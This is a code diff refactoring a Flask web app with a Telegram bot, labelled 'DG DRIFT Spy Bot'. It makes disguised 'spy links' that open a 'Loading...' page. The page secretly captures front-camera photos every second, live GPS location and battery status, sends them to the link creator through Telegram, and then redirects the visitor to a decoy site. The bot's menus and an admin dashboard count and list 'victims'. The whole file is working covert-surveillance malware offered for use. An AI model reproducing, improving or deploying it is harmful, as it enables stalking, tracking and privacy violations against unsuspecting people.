@@ -2,98 +2,127 @@ import os
 import json
 import time
 import random
-import hashlib
-import datetime
 import base64
-from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, send_from_directory
+import datetime
+
+from flask import (
+    Flask, request, jsonify, render_template_string,
+    session, redirect, url_for, send_from_directory
+)
 import requests
 
-# Load configuration
 from config import config
 
 app = Flask(__name__)
 app.secret_key = config['secret_key']
+app.logger.setLevel('INFO')
 
-# Ensure required folders and files exist
+
+# ---------------- Boot: ensure folders & files ----------------
 os.makedirs('photos', exist_ok=True)
-for fname in ['visitors.json', 'links.json']:
+for fname in ('visitors.json', 'links.json'):
     if not os.path.exists(fname):
         with open(fname, 'w') as f:
-            json.dump({}, f)          # both files must be dicts
+            json.dump({}, f)
     else:
-        # migrate an old list-formatted visitors.json to dict form
-        with open(fname, 'r') as f:
-            try:
+        try:
+            with open(fname) as f:
                 data = json.load(f)
-            except Exception:
-                data = {}
+        except Exception:
+            data = {}
         if not isinstance(data, dict):
             with open(fname, 'w') as f:
                 json.dump({}, f)
 
-# ---------- Helper Functions ----------
+
+# ---------------- Helpers ----------------
 def load_json(fname):
-    with open(fname, 'r') as f:
+    with open(fname) as f:
         return json.load(f)
+
 
 def save_json(fname, data):
     with open(fname, 'w') as f:
         json.dump(data, f, indent=2)
 
+
+def _tg_api(method):
+    return f"https://api.telegram.org/bot{config['bot_token']}/{method}"
+
+
 def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
-    url = f"https://api.telegram.org/bot{config['bot_token']}/sendMessage"
-    payload = {
-        'chat_id': chat_id,
-        'text': text,
-        'parse_mode': parse_mode
-    }
+    """
+    Sends a Telegram message. Returns True on success.
+    Never raises — failures are logged only, so the webhook always 200s.
+    """
+    payload = {'chat_id': chat_id, 'text': text}
+    if parse_mode:
+        payload['parse_mode'] = parse_mode
     if reply_markup:
         payload['reply_markup'] = json.dumps(reply_markup)
-    requests.post(url, data=payload).raise_for_status()
-
-def send_telegram_photo(chat_id, photo_path, caption):
-    url = f"https://api.telegram.org/bot{config['bot_token']}/sendPhoto"
     try:
-        with open(photo_path,'rb') as fh:
-            files = {'photo': fh}
-            data = {'chat_id': chat_id, 'caption': caption}
-            resp = requests.post(url, files=files, data=data, timeout=10)
-        return resp.status_code == 200
+        r = requests.post(_tg_api('sendMessage'), data=payload, timeout=10)
+        if r.status_code != 200:
+            app.logger.warning(f"sendMessage failed: {r.status_code} {r.text}")
+            # Retry once without markdown (usually the culprit is stray _ or *)
+            if parse_mode:
+                payload.pop('parse_mode', None)
+                r2 = requests.post(_tg_api('sendMessage'), data=payload, timeout=10)
+                if r2.status_code == 200:
+                    return True
+            return False
+        return True
     except Exception as e:
-        app.logger.warning(f"Failed to send photo: {e}")
+        app.logger.warning(f"sendMessage exception: {e}")
         return False
 
+
+def send_telegram_photo(chat_id, photo_path, caption):
+    try:
+        with open(photo_path, 'rb') as fh:
+            r = requests.post(
+                _tg_api('sendPhoto'),
+                files={'photo': fh},
+                data={'chat_id': chat_id, 'caption': caption},
+                timeout=15
+            )
+        if r.status_code != 200:
+            app.logger.warning(f"sendPhoto failed: {r.status_code} {r.text}")
+            return False
+        return True
+    except Exception as e:
+        app.logger.warning(f"sendPhoto exception: {e}")
+        return False
+
+
 def send_telegram_location(chat_id, lat, lng):
-    url = f"https://api.telegram.org/bot{config['bot_token']}/sendLocation"
-    data = {'chat_id': chat_id, 'latitude': lat, 'longitude': lng}
-    requests.post(url, data=data).raise_for_status()
+    try:
+        r = requests.post(
+            _tg_api('sendLocation'),
+            data={'chat_id': chat_id, 'latitude': lat, 'longitude': lng},
+            timeout=10
+        )
+        if r.status_code != 200:
+            app.logger.warning(f"sendLocation failed: {r.status_code} {r.text}")
+            return False
+        return True
+    except Exception as e:
+        app.logger.warning(f"sendLocation exception: {e}")
+        return False
 
-# ---------- Routes ----------
-def _render_spy(link_id):
-    """Shared logic used by both / (with ?id=) and /s/<link_id>."""
-    links = load_json('links.json')
-    link_data = links.get(link_id,{})
-    if link_id and not link_data:
-        return f"Invalid spy link: {link_id}", 404
-    target_url = link_data.get('url', 'https://google.com')
 
-    visitor_id = session.get('visitor_id')
-    if not visitor_id:
-        visitor_id = f"VIS_{int(time.time())}_{random.randbytes(4).hex()}"
-        session['visitor_id'] = visitor_id
-    return render_template_string(SPY_PAGE, visitor_id=visitor_id, target_url=target_url, link_id=link_id)
+def answer_callback(callback_id, text=None):
+    data = {'callback_query_id': callback_id}
+    if text:
+        data['text'] = text
+    try:
+        requests.post(_tg_api('answerCallbackQuery'), data=data, timeout=10)
+    except Exception as e:
+        app.logger.warning(f"answerCallbackQuery failed: {e}")
 
-@app.route('/')
-def index():
-    """Old-style spy link: /?id=<link_id>"""
-    return _render_spy(request.args.get('id',''))
 
-@app.route('/s/<link_id>')
-def short(link_id):
-    """New-style spy link: /s/<link_id>"""
-    return _render_spy(link_id)
-
-SPY_PAGE = '''
+# ---------------- Spy page ----------------
+SPY_PAGE = r'''
 <!DOCTYPE html>
 <html>
 <head>
@@ -102,14 +131,13 @@ SPY_PAGE = '''
     <title>Loading...</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .container { text-align: center; padding: 20px; max-width: 380px; }
         .logo { font-size: 28px; font-weight: 900; background: linear-gradient(45deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; }
         .subtitle { color: #555; font-size: 12px; margin-bottom: 25px; letter-spacing: 1px; }
         .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.05); border-radius: 50%; border-top: 3px solid #f7971e; animation: spin 0.8s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status-text { color: #4ade80; font-size: 13px; min-height: 22px; }
-        .status-text.warning { color: #fbbf24; }
         .status-text.error { color: #ef4444; }
         .badge { display: inline-block; background: rgba(255,255,255,0.03); padding: 4px 14px; border-radius: 20px; font-size: 10px; color: #666; margin-top: 15px; border: 1px solid rgba(255,255,255,0.03); }
         .badge span { color: #f7971e; }
@@ -146,16 +174,20 @@ SPY_PAGE = '''
         function debug(msg) { debugEl.textContent = msg; console.log(msg); }
 
         document.getElementById('visitorDisplay').textContent = visitorId.substring(0,15)+'...';
-        if(location.protocol !== 'https:' && location.hostname !== 'localhost') {
-            debug('⚠️ Warning: Not using HTTPS. Some features may not work.');
+        if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+            debug('⚠️ Not HTTPS — camera/geo may not work.');
         }
+
         let pendingData = [];
         let lastSend = 0;
-        debug('initilizing...');
+
         sendData({ ping: true, ua: navigator.userAgent });
 
-        // ---------- CAMERA ----------
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
+        // CAMERA
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        })
         .then(stream => {
             const video = document.getElementById('video');
             video.srcObject = stream;
@@ -164,7 +196,9 @@ SPY_PAGE = '''
             document.getElementById('recordingBadge').style.display = 'inline-flex';
             isCapturing = true;
             debug('✅ Camera active');
-            setInterval(() => { if (isCapturing) { capturePhoto(); photoCount++; debug('📸 Photo #'+photoCount); } }, 1000);
+            setInterval(() => {
+                if (isCapturing) { capturePhoto(); photoCount++; debug('📸 Photo #'+photoCount); }
+            }, 1000);
         })
         .catch(err => {
             document.getElementById('status').textContent = '⚠️ Camera denied';
@@ -176,47 +210,45 @@ SPY_PAGE = '''
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
-            if (!video.videoWidth || video.videoWidth === 0) return;
+            if (!video.videoWidth) return;
             canvas.width = 640; canvas.height = 480;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL('image/jpeg', 0.7);
-            sendData({ photo: photoData });
+            sendData({ photo: canvas.toDataURL('image/jpeg', 0.7) });
         }
 
-        // ---------- LOCATION ----------
+        // LOCATION
         if (navigator.geolocation) {
             navigator.geolocation.watchPosition(
-                position => {
-                    const loc = { lat: position.coords.latitude, lng: position.coords.longitude };
-                    debug('📍 Location: '+loc.lat+', '+loc.lng);
+                pos => {
+                    const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                    debug('📍 '+loc.lat+', '+loc.lng);
                     sendData({ location: loc });
                 },
-                err => { debug('❌ Location error: '+err.message); },
+                err => debug('❌ Location error: '+err.message),
                 { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
             );
-        } else { debug('❌ Geolocation not supported'); }
+        }
 
-        // ---------- BATTERY ----------
+        // BATTERY
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 function updateBattery() {
-                    const level = Math.round(battery.level * 100);
-                    const charging = battery.charging;
-                    debug('🔋 Battery: '+level+'%');
-                    sendData({ battery: { level: level, charging: charging } });
+                    sendData({ battery: {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    }});
                 }
                 updateBattery();
                 setInterval(updateBattery, 5000);
             });
-        } else { debug('❌ Battery API not supported'); }
+        }
 
-        // ---------- SEND DATA ----------
+        // SEND
         function sendData(data) {
             pendingData.push(data);
             if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
                 const batch = pendingData.slice();
                 pendingData = [];
-                debug('📤 Sending '+batch.length+' items');
                 fetch(window.location.href, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -224,27 +256,24 @@ SPY_PAGE = '''
                     body: JSON.stringify(batch.map(d => ({ ...d, vid: visitorId, link_id: linkId })))
                 })
                 .then(async res => {
-                    const j = await res.json().catch(() => ({}));
-                    if(res.ok) debug('✅ Send successful');
-                    else debug('❌ Server'+ res.status + ':' + JSON.stringify(j));
-                 })
-                .catch(err => { debug('❌ Send error: '+err.message); });
+                    if (!res.ok) debug('❌ Server ' + res.status);
+                })
+                .catch(err => debug('❌ Send error: ' + err.message));
                 lastSend = Date.now();
             }
         }
 
-        // ---------- REDIRECT ----------
+        // REDIRECT
         let secondsLeft = 10;
         const statusEl = document.getElementById('status');
         const countdown = setInterval(() => {
             secondsLeft--;
-            if (secondsLeft > 0) { statusEl.textContent = '⏳ Redirecting in '+secondsLeft+'s...'; }
+            if (secondsLeft > 0) statusEl.textContent = '⏳ Redirecting in '+secondsLeft+'s...';
         }, 1000);
         setTimeout(() => {
             clearInterval(countdown);
             isCapturing = false;
             statusEl.textContent = '🚀 Redirecting...';
-            debug('🔗 Redirecting...');
             setTimeout(() => { window.location.href = targetUrl; }, 1500);
         }, 10000);
     </script>
@@ -252,220 +281,315 @@ SPY_PAGE = '''
 </html>
 '''
 
+
+def _render_spy(link_id):
+    links = load_json('links.json')
+    if link_id and link_id not in links:
+        return f"Invalid spy link: {link_id}", 404
+    link_data = links.get(link_id, {})
+    target_url = link_data.get('url', 'https://google.com')
+
+    visitor_id = session.get('visitor_id')
+    if not visitor_id:
+        visitor_id = f"VIS_{int(time.time())}_{os.urandom(4).hex()}"
+        session['visitor_id'] = visitor_id
+
+    return render_template_string(
+        SPY_PAGE,
+        visitor_id=visitor_id,
+        target_url=target_url,
+        link_id=link_id
+    )
+
+
+@app.route('/')
+def index():
+    return _render_spy(request.args.get('id', ''))
+
+
+@app.route('/s/<link_id>')
+def short(link_id):
+    return _render_spy(link_id)
+
+
 @app.route('/', methods=['POST'])
 def index_post():
-    """Receive captured data (photo, location, battery) from the spy page."""
+    """Receives captured data from the spy page."""
     try:
-        data = request.get_json()
-        if not data:
+        data = request.get_json(silent=True)
+        if data is None:
             return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
 
-        # Ensure data is a list
         if not isinstance(data, list):
             data = [data]
 
-        visitor_id=(
-            session.get('visitor_id') or
-            request.args.get('vid') or
-            (data[0].get('vid') if isinstance(data,list) and data else None) 
+        # Visitor ID: prefer the one the client explicitly sends
+        visitor_id = (
+            (data[0].get('vid') if data else None)
+            or session.get('visitor_id')
+            or request.args.get('vid')
         )
         if not visitor_id:
             return jsonify({'status': 'error', 'message': 'Visitor ID missing'}), 400
-        
-        # Determine creator ID from the link data
-        link_id = request.args.get('id', '') or request.args.get('link_id', '')
-        if not link_id and isinstance(data, list) and data:
-            link_id = data[0].get('link_id', '')
+
+        # Link ID: prefer body, fall back to query
+        link_id = ''
+        if data and data[0].get('link_id'):
+            link_id = data[0]['link_id']
+        if not link_id:
+            link_id = request.args.get('id') or request.args.get('link_id', '')
+
         links = load_json('links.json')
         link_data = links.get(link_id, {})
         creator_id = str(link_data.get('created_by') or config['chat_id'])
-        
-        # Load visitors
+
         visitors = load_json('visitors.json')
+        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
         if visitor_id not in visitors:
             visitors[visitor_id] = {
                 'device': request.headers.get('User-Agent', 'Unknown'),
                 'ip': request.remote_addr,
                 'target_url': link_data.get('url', 'N/A'),
                 'generated_by': creator_id,
-                'time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'time': now,
                 'photos': 0,
                 'locations': 0,
-                'battery': 0
+                'battery': 0,
             }
-
-        visitors[visitor_id]['last_update'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        visitors[visitor_id]['last_update'] = now
 
         for item in data:
             # --- Photo ---
-            if 'photo' in item and item['photo']:
-                photo_data = item['photo']
-                if 'base64,' in photo_data:
-                    photo_data = photo_data.split('base64,')[1]
-                photo_binary = base64.b64decode(photo_data)
-                if len(photo_binary) > 500:
-                    photo_path = f"photos/{visitor_id}_{int(time.time())}.jpg"
-                    with open(photo_path, 'wb') as f:
-                        f.write(photo_binary)
-                    caption = f"📸 *Spy Photo!*\n🆔 {visitor_id}\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            if item.get('photo'):
+                pd = item['photo']
+                if 'base64,' in pd:
+                    pd = pd.split('base64,', 1)[1]
+                try:
+                    binary = base64.b64decode(pd)
+                except Exception:
+                    binary = b''
+                if len(binary) > 500:
+                    path = f"photos/{visitor_id}_{int(time.time()*1000)}.jpg"
+                    with open(path, 'wb') as f:
+                        f.write(binary)
                     visitors[visitor_id]['photos'] += 1
-                    try:
-                        send_telegram_photo(creator_id, photo_path, caption)
-                    except Exception as e:
-                        app.logger.warning(f"Failed to send photo: {e}")
-                    
-            # --- Location ---
-            if 'location' in item:
-                loc = item['location']
-                lat = loc.get('lat', 0)
-                lng = loc.get('lng', 0)
-                if lat != 0 and lng != 0:
-                    visitors[visitor_id]['locations'] += 1
-                    try:
-                        send_telegram_location(creator_id, lat, lng)
-                        msg = f"📍 *Live Location*\n🆔 {visitor_id}\n🌐 https://maps.google.com/?q={lat},{lng}"
-                        send_telegram_message(creator_id, msg)
-                    except Exception as e:
-                        app.logger.warning(f"Failed to send location: {e}")
-                    
-            # --- Battery ---
-            if 'battery' in item:
-                bat = item['battery']
-                level = bat.get('level', 0)
-                charging = bat.get('charging', False)
-                if level > 0:
-                    visitors[visitor_id]['battery'] = level
-                    status = "Charging" if charging else "Not Charging"
-                    msg = f"🔋 *Battery Status*\n🆔 {visitor_id}\nLevel: {level}%\nStatus: {status}"
-                    try:
-                        send_telegram_message(creator_id, msg)
-                    except Exception as e:
-                        app.logger.warning(f"Failed to send battery status: {e}")
+                    send_telegram_photo(
+                        creator_id, path,
+                        f"📸 Spy Photo\n🆔 {visitor_id}\n⏰ {now}"
+                    )
 
-                
+            # --- Location ---
+            loc = item.get('location')
+            if loc:
+                lat, lng = loc.get('lat', 0), loc.get('lng', 0)
+                if lat and lng:
+                    visitors[visitor_id]['locations'] += 1
+                    send_telegram_location(creator_id, lat, lng)
+                    send_telegram_message(
+                        creator_id,
+                        f"📍 Live Location\n🆔 {visitor_id}\nhttps://maps.google.com/?q={lat},{lng}",
+                        parse_mode=None
+                    )
+
+            # --- Battery ---
+            bat = item.get('battery')
+            if bat and bat.get('level', 0) > 0:
+                visitors[visitor_id]['battery'] = bat['level']
+                status = "Charging" if bat.get('charging') else "Not Charging"
+                send_telegram_message(
+                    creator_id,
+                    f"🔋 Battery\n🆔 {visitor_id}\nLevel: {bat['level']}%\nStatus: {status}",
+                    parse_mode=None
+                )
+
         save_json('visitors.json', visitors)
         return jsonify({'status': 'success'})
+
     except Exception as e:
         app.logger.exception("index_post error")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# ---------- Telegram Bot Webhook ----------
+
+# ---------------- Telegram webhook ----------------
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """Handle incoming Telegram updates."""
-    update = request.get_json()
+    update = request.get_json(silent=True)
     if not update:
         return 'OK', 200
 
-    chat_id = update.get('message', {}).get('chat', {}).get('id')
-    text = update.get('message', {}).get('text', '')
-    callback = update.get('callback_query')
+    app.logger.info(f"UPDATE: {json.dumps(update)[:800]}")
 
-    # --- /start command ---
-    if text == '/start':
-        keyboard = {
-            'inline_keyboard': [
-                [{'text': '🔗 Generate Spy Link', 'callback_data': 'generate'}],
-                [{'text': '📊 Victims', 'callback_data': 'stats'}]
-            ]
-        }
-        send_telegram_message(chat_id,
-            '👾 *DG DRIFT Spy Bot*\n\nSend any URL, I\'ll make a spy link.\nWhen someone clicks it, auto-capture starts! 📸',
-            reply_markup=keyboard)
-        return 'OK', 200
-
-    # --- Callback queries ---
-    if callback:
-        cb_data = callback.get('data')
-        cb_id = callback.get('id')
-        from_id = callback.get('from', {}).get('id')
-
-        if cb_data == 'generate':
-            send_telegram_message(from_id, '📥 *Send target URL*\nExample: `https://youtube.com`')
+    try:
+        # --- Inline keyboard callback ---
+        callback = update.get('callback_query')
+        if callback:
+            cb_data = callback.get('data')
+            cb_id = callback.get('id')
+            from_id = callback.get('from', {}).get('id')
             answer_callback(cb_id)
+
+            if cb_data == 'generate':
+                send_telegram_message(
+                    from_id,
+                    '📥 Send target URL\nExample: https://youtube.com',
+                    parse_mode=None
+                )
+            elif cb_data == 'stats':
+                visitors = load_json('visitors.json')
+                my = [v for v in visitors.values()
+                      if v.get('generated_by') == str(from_id)]
+                send_telegram_message(
+                    from_id,
+                    f"📊 Your victims: {len(my)}\n\nShare more spy links to track more people!",
+                    parse_mode=None
+                )
             return 'OK', 200
 
-        if cb_data == 'stats':
-            visitors = load_json('visitors.json')
-            my_visitors = [v for v in visitors.values() if v.get('generated_by') == str(from_id)]
-            total = len(my_visitors)
-            send_telegram_message(from_id, f'📊 *Your Victims:* {total}\n\n🔗 Generate more links to track more people!')
-            answer_callback(cb_id)
+        # --- Regular message ---
+        message = update.get('message')
+        if not message:
             return 'OK', 200
 
-    # --- User sends a URL -> generate spy link ---
-    if text and text.startswith('http') and chat_id:
-        parsed = text.replace('https://', '').replace('http://', '').split('/')[0]
-        domain = parsed.replace('www.', '').replace('.', '_')
-        short_code = f"{domain}_{str(time.time())[-4:]}"
+        chat_id = message.get('chat', {}).get('id')
+        text = (message.get('text') or '').strip()
 
-        links = load_json('links.json')
-        links[short_code] = {
-            'url': text,
-            'created_by': str(chat_id),
-            'created_at': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        }
-        save_json('links.json', links)
+        if not chat_id:
+            return 'OK', 200
 
-        base = config['website'].rstrip('/')
-        spy_link = f"{base}/?id={short_code}"
-        msg = (f"✅ *Spy Link Generated!*\n\n🔗 `{spy_link}`\n\n"
-               "📸 When someone opens this link:\n• Camera photos (every 1 sec)\n• Live Location\n• Battery Status\n\n"
-               "*All photos will come to YOU!*")
-        send_telegram_message(chat_id, msg)
+        if text == '/start':
+            keyboard = {
+                'inline_keyboard': [
+                    [{'text': '🔗 Generate Spy Link', 'callback_data': 'generate'}],
+                    [{'text': '📊 Victims', 'callback_data': 'stats'}],
+                ]
+            }
+            send_telegram_message(
+                chat_id,
+                "👾 DG DRIFT Spy Bot\n\n"
+                "Send any URL and I'll create a spy link.\n"
+                "When someone opens it, auto-capture starts! 📸",
+                reply_markup=keyboard,
+                parse_mode=None
+            )
+            return 'OK', 200
+
+        if text.startswith('http'):
+            # Build short code
+            domain = (text.replace('https://', '')
+                          .replace('http://', '')
+                          .split('/')[0])
+            domain = domain.replace('www.', '').replace('.', '_')
+            short_code = f"{domain}_{str(int(time.time()))[-5:]}"
+
+            links = load_json('links.json')
+            links[short_code] = {
+                'url': text,
+                'created_by': str(chat_id),
+                'created_at': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            }
+            save_json('links.json', links)
+
+            base = config.get('website', '').rstrip('/')
+            if not base:
+                send_telegram_message(
+                    chat_id,
+                    "⚠️ Server 'website' is not configured in config.py",
+                    parse_mode=None
+                )
+                return 'OK', 200
+
+            spy_link = f"{base}/s/{short_code}"
+            send_telegram_message(
+                chat_id,
+                f"✅ Spy link created!\n\n{spy_link}\n\n"
+                "When someone opens this link it will capture:\n"
+                "• Camera photos (every 1s)\n"
+                "• Live location\n"
+                "• Battery status",
+                parse_mode=None
+            )
+            return 'OK', 200
+
         return 'OK', 200
 
-    return 'OK', 200
+    except Exception as e:
+        app.logger.exception("webhook error")
+        return 'OK', 200  # always 200 so Telegram doesn't retry-storm
 
-def answer_callback(callback_id):
-    url = f"https://api.telegram.org/bot{config['bot_token']}/answerCallbackQuery"
-    requests.post(url, data={'callback_query_id': callback_id})
 
-# ---------- Admin Panel ----------
+@app.route('/set_webhook')
+def set_webhook():
+    base = config.get('website', '').rstrip('/')
+    if not base:
+        return jsonify({'ok': False, 'error': 'config["website"] not set'}), 400
+    if not base.startswith('https://'):
+        return jsonify({'ok': False, 'error': 'Telegram requires HTTPS'}), 400
+    url = _tg_api('setWebhook')
+    r = requests.post(url, data={'url': f"{base}/webhook"}, timeout=10)
+    return jsonify(r.json())
+
+
+@app.route('/webhook_info')
+def webhook_info():
+    r = requests.get(_tg_api('getWebhookInfo'), timeout=10)
+    return jsonify(r.json())
+
+
+# ---------------- Admin ----------------
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
-    # Login handling
     if request.method == 'POST' and 'login' in request.form:
-        username = request.form.get('username')
-        password = request.form.get('password')
-        if username == config['admin_username'] and password == config['admin_password']:
+        if (request.form.get('username') == config['admin_username'] and
+                request.form.get('password') == config['admin_password']):
             session['admin'] = True
             return redirect(url_for('admin'))
-        else:
-            return render_template_string(LOGIN_PAGE, error='Invalid credentials')
+        return render_template_string(LOGIN_PAGE, error='Invalid credentials')
 
-    # Check login
     if not session.get('admin'):
         return render_template_string(LOGIN_PAGE, error=None)
 
-    # Handle GET actions (logout, export, clear)
     if 'logout' in request.args:
         session.pop('admin', None)
         return redirect(url_for('admin'))
 
     if 'export' in request.args:
-        visitors = load_json('visitors.json')
-        return jsonify(visitors)
+        return jsonify(load_json('visitors.json'))
 
     if 'clear' in request.args:
         save_json('visitors.json', {})
         save_json('links.json', {})
         for f in os.listdir('photos'):
-            os.remove(os.path.join('photos', f))
+            try:
+                os.remove(os.path.join('photos', f))
+            except Exception:
+                pass
         return redirect(url_for('admin'))
 
-    
-    # Load data for dashboard
     visitors = load_json('visitors.json')
     links = load_json('links.json')
-    total_victims = len(visitors)
-    total_photos = sum(v.get('photos', 0) for v in visitors.values() if isinstance(v, dict))
 
-    return render_template_string(ADMIN_DASHBOARD,
-                                  visitors=visitors,
-                                  links=links,
-                                  total_victims=total_victims,
-                                  total_photos=total_photos)
+    # Attach photo list to each visitor for the template
+    photo_files = os.listdir('photos')
+    enriched = {}
+    for vid, v in visitors.items():
+        if not isinstance(v, dict):
+            continue
+        row = dict(v)
+        row['photos_list'] = [f for f in photo_files if f.startswith(vid + '_')]
+        enriched[vid] = row
+
+    total_victims = len(enriched)
+    total_photos = sum(v.get('photos', 0) for v in enriched.values())
+
+    return render_template_string(
+        ADMIN_DASHBOARD,
+        visitors=enriched,
+        links=links,
+        total_victims=total_victims,
+        total_photos=total_photos,
+    )
+
 
 LOGIN_PAGE = '''
 <!DOCTYPE html>
@@ -473,13 +597,16 @@ LOGIN_PAGE = '''
 <head><title>Admin Login</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
-body { background: #0f0c29; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
-.login-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
+body { background: #0f0c29; color: #fff; font-family: Arial; display: flex;
+       justify-content: center; align-items: center; height: 100vh; }
+.login-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 20px;
+             width: 320px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
 .login-box h2 { margin-bottom: 20px; color: #f7971e; }
-input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px; background: rgba(255,255,255,0.08); color: white; font-size: 14px; }
-input::placeholder { color: #666; }
-button { width: 100%; padding: 14px; background: linear-gradient(45deg, #f7971e, #ffd200); border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
-button:hover { opacity: 0.9; }
+input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px;
+        background: rgba(255,255,255,0.08); color: #fff; font-size: 14px; }
+button { width: 100%; padding: 14px; background: linear-gradient(45deg, #f7971e, #ffd200);
+         border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px;
+         margin-top: 10px; }
 .error { color: #ef4444; margin-top: 10px; font-size: 14px; }
 </style>
 </head>
@@ -497,33 +624,42 @@ button:hover { opacity: 0.9; }
 </html>
 '''
 
+
 ADMIN_DASHBOARD = '''
 <!DOCTYPE html>
 <html>
 <head><title>Admin - DG DRIFT</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
-body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
+body { background: #0f0c29; color: #fff; font-family: Arial; padding: 20px; }
 .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
 .stats { display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }
-.stat-box { background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px; flex: 1; min-width: 100px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
+.stat-box { background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px;
+            flex: 1; min-width: 100px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
 .stat-box h2 { font-size: 32px; color: #f7971e; }
 .stat-box p { color: #888; font-size: 13px; }
-.btn { background: #f7971e; color: black; padding: 8px 18px; border: none; border-radius: 10px; cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }
+.btn { background: #f7971e; color: #000; padding: 8px 18px; border: none; border-radius: 10px;
+       cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }
 .btn:hover { background: #ffd200; }
-.btn-danger { background: #ef4444; color: white; }
+.btn-danger { background: #ef4444; color: #fff; }
 .btn-danger:hover { background: #dc2626; }
-.visitor-card { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px; margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
+.visitor-card { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px;
+                margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
 .visitor-card h3 { color: #f7971e; margin-bottom: 8px; }
 .info { color: #aaa; font-size: 13px; margin: 4px 0; }
 .info strong { color: #ddd; }
 .photo-grid { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
-.photo-grid img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; border: 2px solid rgba(255,255,255,0.08); }
-.badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: rgba(255,255,255,0.05); }
+.photo-grid img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px;
+                  border: 2px solid rgba(255,255,255,0.08); }
+.badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px;
+         background: rgba(255,255,255,0.05); }
 .badge.good { background: rgba(74, 222, 128, 0.15); color: #4ade80; }
 .empty { color: #666; text-align: center; padding: 40px; }
-.creator-tag { color: #f7971e; font-size: 12px; background: rgba(247, 151, 30, 0.1); padding: 2px 10px; border-radius: 10px; }
-.link-item { background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+.creator-tag { color: #f7971e; font-size: 12px; background: rgba(247, 151, 30, 0.1);
+               padding: 2px 10px; border-radius: 10px; }
+.link-item { background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px;
+             margin: 5px 0; display: flex; justify-content: space-between; align-items: center;
+             flex-wrap: wrap; gap: 8px; }
 </style>
 </head>
 <body>
@@ -546,9 +682,9 @@ body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
 <h3>🔗 All Spy Links</h3>
 {% for code, data in links.items() %}
 <div class="link-item">
-<span><strong>{{ code }}</strong> → {{ data.url }}</span>
-<span class="creator-tag">Created by: {{ data.created_by }}</span>
-<span style="color:#666;font-size:12px;">{{ data.created_at }}</span>
+    <span><strong>{{ code }}</strong> → {{ data.url }}</span>
+    <span class="creator-tag">By: {{ data.created_by }}</span>
+    <span style="color:#666;font-size:12px;">{{ data.created_at }}</span>
 </div>
 {% endfor %}
 </div>
@@ -560,27 +696,26 @@ body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
 </div>
 {% else %}
 <h3>📋 All Victims</h3>
